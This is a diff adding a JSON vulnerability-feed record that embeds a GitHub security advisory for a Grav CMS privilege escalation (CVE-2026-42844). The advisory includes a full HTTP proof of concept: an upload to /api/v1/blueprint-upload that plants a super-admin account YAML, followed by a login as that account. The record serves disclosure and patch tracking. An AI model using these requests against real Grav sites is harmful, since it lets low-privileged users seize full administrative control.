@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/178706816?v=4\", \"events_url\": \"https://api.github.com/users/0d000721999/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/0d000721999/followers\", \"following_url\": \"https://api.github.com/users/0d000721999/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/0d000721999/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/0d000721999\", \"id\": 178706816, \"login\": \"0d000721999\", \"node_id\": \"U_kgDOCqbZgA\", \"organizations_url\": \"https://api.github.com/users/0d000721999/orgs\", \"received_events_url\": \"https://api.github.com/users/0d000721999/received_events\", \"repos_url\": \"https://api.github.com/users/0d000721999/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/0d000721999/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/0d000721999/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/0d000721999\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42844\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-269\", \"name\": \"Improper Privilege Management\"}, {\"cwe_id\": \"CWE-434\", \"name\": \"Unrestricted Upload of File with Dangerous Type\"}], \"description\": \"## Summary\\n\\nIn Grav `2.0.0-beta.2`, a low-privileged authenticated API user with `api.media.write` can abuse `/api/v1/blueprint-upload` to write an arbitrary YAML file into `user/accounts/`, then log in as the newly created account with `api.super` privileges.\\n\\nThis results in full administrative compromise of the Grav API.\\n\\n## Details\\n\\nThe vulnerability is located in the API plugin's blueprint upload flow:\\n\\n- `user/plugins/api/classes/Api/ApiRouter.php:261`\\n- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:32-45`\\n- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:102-114`\\n- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:271-308`\\n- `user/plugins/api/classes/Api/Controllers/BlueprintUploadController.php:407-417`\\n- `user/plugins/api/classes/Api/Controllers/AuthController.php:41-55`\\n\\nThe issue exists because `/api/v1/blueprint-upload` accepts caller-controlled `destination` and `scope` values and uses them to resolve the final filesystem write target.\\n\\nWhen the request uses:\\n\\n- `destination=self@:`\\n- `scope=users/anything`\\n\\nThe server resolves the write target to the shared account directory:\\n\\n```text\\nuser/accounts/\\n```\\n\\nThe upload handler then writes the supplied file directly into that directory and does not block YAML account files. Because Grav accepts account YAML files and supports a plaintext `password:` field on first login, an attacker can create a fully functional administrator account with `api.super`.\\n\\nThe required attacker privilege is low:\\n\\n```yaml\\naccess:\\n  api:\\n    access: true\\n    media:\\n      write: true\\n```\\n\\n## PoC\\n\\n### Step 1: Authenticate as the low-privileged API user\\n\\n```http\\nPOST /api/v1/auth/token HTTP/1.1\\nHost: 127.0.0.1:8123\\nContent-Type: application/json\\nConnection: close\\n\\n{\\\"username\\\":\\\"uploader\\\",\\\"password\\\":\\\"Upload123A\\\"}\\n```\\n\\nExtract:\\n\\n```text\\nUPLOADER_TOKEN = <access_token from response>\\n```\\n\\nAttachment:\\n\\n<img width=\\\"1480\\\" height=\\\"825\\\" alt=\\\"login-uploader\\\" src=\\\"https://github.com/user-attachments/assets/5aeda840-4a37-4365-8e46-caec88066541\\\" />\\n\\n### Step 2: Upload a malicious account YAML file\\n\\n```http\\nPOST /api/v1/blueprint-upload HTTP/1.1\\nHost: 127.0.0.1:8123\\nX-API-Token: <UPLOADER_TOKEN>\\nContent-Type: multipart/form-data; boundary=----CodexBoundaryF01\\nConnection: close\\n\\n------CodexBoundaryF01\\nContent-Disposition: form-data; name=\\\"destination\\\"\\n\\nself@:\\n------CodexBoundaryF01\\nContent-Disposition: form-data; name=\\\"scope\\\"\\n\\nusers/anything\\n------CodexBoundaryF01\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"pwned.yaml\\\"\\nContent-Type: text/yaml\\n\\nemail: attacker@example.com\\nfullname: attacker\\ntitle: Site Administrator\\nstate: enabled\\npassword: Passw0rd!123\\naccess:\\n  site:\\n    login: true\\n  api:\\n    super: true\\n------CodexBoundaryF01--\\n```\\n\\nExpected result:\\n\\n```json\\n{\\n  \\\"data\\\": [\\n    {\\n      \\\"name\\\": \\\"pwned.yaml\\\",\\n      \\\"path\\\": \\\"user/accounts/pwned.yaml\\\"\\n    }\\n  ]\\n}\\n```\\n\\nAttachment:\\n\\n<img width=\\\"1484\\\" height=\\\"797\\\" alt=\\\"upload\\\" src=\\\"https://github.com/user-attachments/assets/0b24c03f-cac5-4b4d-840c-52ac0840969f\\\" />\\n\\n### Step 3: Log in as the newly created account\\n\\n```http\\nPOST /api/v1/auth/token HTTP/1.1\\nHost: 127.0.0.1:8123\\nContent-Type: application/json\\nConnection: close\\n\\n{\\\"username\\\":\\\"pwned\\\",\\\"password\\\":\\\"Passw0rd!123\\\"}\\n```\\n\\nExpected result:\\n\\n```json\\n{\\n  \\\"data\\\": {\\n    \\\"user\\\": {\\n      \\\"username\\\": \\\"pwned\\\",\\n      \\\"super_admin\\\": true\\n    }\\n  }\\n}\\n```\\n\\nAttachment:\\n\\n<img width=\\\"1494\\\" height=\\\"830\\\" alt=\\\"pwned-login\\\" src=\\\"https://github.com/user-attachments/assets/7a1ab7fc-d3fb-4077-9b61-09cd947241fe\\\" />\\n\\n### Step 4: Verify privileged API access\\n\\n```http\\nGET /api/v1/system/info HTTP/1.1\\nHost: 127.0.0.1:8123\\nX-API-Token: <PWNED_TOKEN>\\nConnection: close\\n```\\n\\nExpected result:\\n\\nThe request succeeds and returns system-level information.\\n\\nAttachment:\\n\\n<img width=\\\"1480\\\" height=\\\"831\\\" alt=\\\"system-info\\\" src=\\\"https://github.com/user-attachments/assets/31677d61-3dbd-4ea6-9fbe-80799a628cc2\\\" />\\n\\n## Impact\\n\\nThis is an authenticated vertical privilege-escalation vulnerability.\\n\\nAny API user with basic media upload capability can escalate directly to a full API super administrator by planting a new account YAML file. Once `api.super` access is obtained, the attacker gains full control over the CMS management API and can:\\n\\n- modify content\\n- alter configuration\\n- manage users\\n- install or update plugins/themes\\n- access system-level administration features\\n\\nIn a real deployment, this level of control is sufficient for complete CMS compromise and may be chained into server-side code execution depending on enabled plugins, writable template paths, or package-management workflow.\\n\\nThis issue was reproduced locally:\\n\\n- the upload response returned `user/accounts/pwned.yaml`\\n- logging in as `pwned` succeeded\\n- the new account had `super_admin = true`\\n- privileged endpoints such as `/api/v1/system/info` were accessible\", \"epss\": {\"percentage\": 0.00336, \"percentile\": 0.25516}, \"ghsa_id\": \"GHSA-6xx2-m8wv-756h\", \"github_reviewed_at\": \"2026-05-06T21:19:21Z\", \"html_url\": \"https://github.com/advisories/GHSA-6xx2-m8wv-756h\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6xx2-m8wv-756h\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42844\"}], \"nvd_published_at\": \"2026-05-12T22:16:34Z\", \"published_at\": \"2026-05-06T21:19:21Z\", \"references\": [\"https://github.com/getgrav/grav/security/advisories/GHSA-6xx2-m8wv-756h\", \"https://github.com/getgrav/grav-plugin-api/commit/97fc02844a35f743dfe93d34efd92d47eedd5bc5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42844\", \"https://github.com/advisories/GHSA-6xx2-m8wv-756h\"], \"repository_advisory_url\": \"https://api.github.com/repos/getgrav/grav/security-advisories/GHSA-6xx2-m8wv-756h\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/getgrav/grav\", \"summary\": \"Low-privileged Grav API users can create super-admin accounts via blueprint-upload\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-13T16:41:21Z\", \"url\": \"https://api.github.com/advisories/GHSA-6xx2-m8wv-756h\", \"vulnerabilities\": [{\"first_patched_version\": \"2.0.0-beta.4\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"getgrav/grav\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.0.0-beta.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6xx2-m8wv-756h",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "getgrav/grav: < 2.0.0-beta.4"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-42844"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "getgrav/grav"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.476529Z",
+  "provenance": {
+    "content_sha256": "89958ee8755b9bb01888d89df5fe17d925983b41ccd55fabb295e1ff6c3aa1e2",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-06T21:19:21Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6xx2-m8wv-756h",
+  "status": "active",
+  "title": "Low-privileged Grav API users can create super-admin accounts via blueprint-upload",
+  "updated_at": "2026-05-13T16:41:21Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6xx2-m8wv-756h"
+}
